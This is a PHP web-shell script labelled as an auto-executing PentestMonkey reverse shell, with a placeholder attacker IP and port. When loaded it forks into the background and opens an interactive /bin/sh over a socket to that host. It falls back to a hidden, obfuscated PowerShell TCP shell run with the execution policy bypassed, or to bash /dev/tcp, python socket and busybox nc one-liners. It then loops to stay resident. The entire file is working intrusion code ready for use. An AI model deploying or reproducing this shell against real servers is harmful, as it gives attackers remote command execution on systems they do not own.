<?php
/**
 *  Auto-Execute PentestMonkey Reverse Shell
 *  No HTML/CSS - Pure PHP
 */

// ============================================
// CONFIGURATION - CHANGE THESE
// ============================================
$AUTO_IP = '192.168.45.240';  // Your Kali IP
$AUTO_PORT = 4444;            // Your listener port

// ============================================
// PENTESTMONKEY REVERSE SHELL
// ============================================
function pentestmonkey_reverse_shell($ip, $port) {
    set_time_limit(0);
    $chunk_size = 1400;
    $write_a = null;
    $error_a = null;
    $shell = 'uname -a; w; id; /bin/sh -i';
    $daemon = 0;
    $debug = 0;

    // Daemonise if possible
    if (function_exists('pcntl_fork')) {
        $pid = pcntl_fork();
        if ($pid == -1) {
            return "ERROR: Can't fork";
        }
        if ($pid) {
            exit(0);
        }
        if (posix_setsid() == -1) {
            return "Error: Can't setsid()";
        }
        $daemon = 1;
    }

    chdir("/");
    umask(0);

    // Open reverse connection
    $sock = @fsockopen($ip, $port, $errno, $errstr, 30);
    if (!$sock) {
        return "Connection failed: $errstr ($errno)";
    }

    // Spawn shell process
    $descriptorspec = array(
        0 => array("pipe", "r"),
        1 => array("pipe", "w"),
        2 => array("pipe", "w")
    );

    $process = proc_open($shell, $descriptorspec, $pipes);

    if (!is_resource($process)) {
        return "ERROR: Can't spawn shell";
    }

    stream_set_blocking($pipes[0], 0);
    stream_set_blocking($pipes[1], 0);
    stream_set_blocking($pipes[2], 0);
    stream_set_blocking($sock, 0);

    $result = "Successfully opened reverse shell to $ip:$port\n";

    while (1) {
        if (feof($sock)) {
            $result .= "ERROR: Shell connection terminated\n";
            break;
        }
        if (feof($pipes[1])) {
            $result .= "ERROR: Shell process terminated\n";
            break;
        }

        $read_a = array($sock, $pipes[1], $pipes[2]);
        $num_changed_sockets = @stream_select($read_a, $write_a, $error_a, null);

        if (in_array($sock, $read_a)) {
            $input = fread($sock, $chunk_size);
            fwrite($pipes[0], $input);
        }

        if (in_array($pipes[1], $read_a)) {
            $input = fread($pipes[1], $chunk_size);
            fwrite($sock, $input);
        }

        if (in_array($pipes[2], $read_a)) {
            $input = fread($pipes[2], $chunk_size);
            fwrite($sock, $input);
        }
    }

    fclose($sock);
    fclose($pipes[0]);
    fclose($pipes[1]);
    fclose($pipes[2]);
    proc_close($process);

    return $result;
}

// ============================================
// QUICK REVERSE SHELL (Fallback)
// ============================================
function quick_reverse_shell($ip, $port) {
    $os = DIRECTORY_SEPARATOR == '/' ? 'nix' : 'win';
    
    if ($os == 'win') {
        $ps_revshell = '$84b5d7ab8755451cb386a79589e39fa8 = New-Object System.Net.Sockets.TCPClient(\'' . $ip . '\',' . $port . ');$3b95c1d3d7dc4e4fa6474ce1bceae743 = $84b5d7ab8755451cb386a79589e39fa8.GetStream();[byte[]]$367ad63a4a834bf5bb275aab24a4890c = 0..65535|%{0};while(($d084ee484cf44c09003024847840f3d = $3b95c1d3d7dc4e4fa6474ce1bceae743.Read($367ad63a4a834bf5bb275aab24a4890c, 0, $367ad63a4a834bf5bb275aab24a4890c.Length)) -ne 0){;$b16fd2353f0d413484e1583776256f61 = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($367ad63a4a834bf5bb275aab24a4890c,0, $d084ee484cf44c09003024847840f3d);$b396f8bb13ec47c28e4f721085e95361 = (iex $b16fd2353f0d413484e1583776256f61 2>&1 | Out-String );$2bfb84697b834fa09479071ec68d6b19 = $b396f8bb13ec47c28e4f721085e95361 + \'PS \' + $(gl) + \'> \';$12e0e1f0c5e14474b53907ee11f75ed7 = ([text.encoding]::ASCII).GetBytes($2bfb84697b834fa09479071ec68d6b19);$3b95c1d3d7dc4e4fa6474ce1bceae743.Write($12e0e1f0c5e14474b53907ee11f75ed7,0,$12e0e1f0c5e14474b53907ee11f75ed7.Length);$3b95c1d3d7dc4e4fa6474ce1bceae743.Flush()};$84b5d7ab8755451cb386a79589e39fa8.Close()';
        @pclose(@popen('start /B powershell -NoP -NonI -W Hidden -Exec Bypass -Command "' . $ps_revshell . '"', 'r'));
        return "PowerShell reverse shell sent to $ip:$port";
    } else {
        $cmds = [
            "bash -c \"bash -i >& /dev/tcp/$ip/$port 0>&1\"",
            "python3 -c \"import socket,subprocess,os;s=socket.socket();s.connect(('$ip',$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])\"",
            "busybox nc $ip $port -e /bin/bash"
        ];
        foreach ($cmds as $cmd) {
            @exec($cmd . ' > /dev/null 2>&1 &');
        }
        return "Reverse shell sent to $ip:$port";
    }
}

// ============================================
// EXECUTE REVERSE SHELL
// ============================================

// Try PentestMonkey first
$result = pentestmonkey_reverse_shell($AUTO_IP, $AUTO_PORT);

// If PentestMonkey fails, try Quick Shell
if (strpos($result, "ERROR") !== false || strpos($result, "failed") !== false) {
    $result = quick_reverse_shell($AUTO_IP, $AUTO_PORT);
}

// Output result (optional - comment out if you want silent execution)
echo "[" . date('Y-m-d H:i:s') . "] " . $result . "\n";

// Background execution - script will continue running
// The reverse shell will stay connected in the background
while (true) {
    sleep(60);
}
?>